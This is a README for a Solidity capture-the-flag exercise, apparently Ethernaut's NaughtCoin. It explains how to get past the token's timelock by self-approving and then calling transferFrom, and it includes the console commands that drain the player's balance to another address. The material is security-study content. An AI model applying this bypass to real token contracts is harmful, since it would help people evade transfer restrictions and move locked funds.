# naughtcoin

Educational Solidity timelock/ERC20 transfer example from the NaughtCoin CTF.

## Source and reproduction

Inspected Solidity: `naught.sol`. Contracts include `NaughtCoin`. Source compiler pragmas: `^0.6.0`.

No complete pinned compiler/dependency build harness was found in the inspected files. Import resolution and automated execution are unverified; an isolated local test harness is required before running the example.

This is a prototype/security-study example. Do not interpret the source as audited production code or execute it against third-party deployments. No on-chain transaction was performed.

No repository-wide license file was found; no license has been assigned by this maintenance change.

## Existing notes and attribution

# naughtcoin
 
using the approved solidity function we can actually approve ourselves so we can unlock the amount we can send. Then we simply use transfer from to send the tokens to another contract

(await contract.balanceOf(player)).toString()
await contract.approve(player, "999999999990000000000000")
contract.transferFrom(player, "0x99260eB35106FCe9FAE0bBa2e86193fD90bD56dF","999999999990000000000000")<img width="1536" alt="naught" src="https://user-images.githubusercontent.com/63403890/186503190-5c9ff1b7-a3f0-42f1-a39d-40812f4f9e44.png">
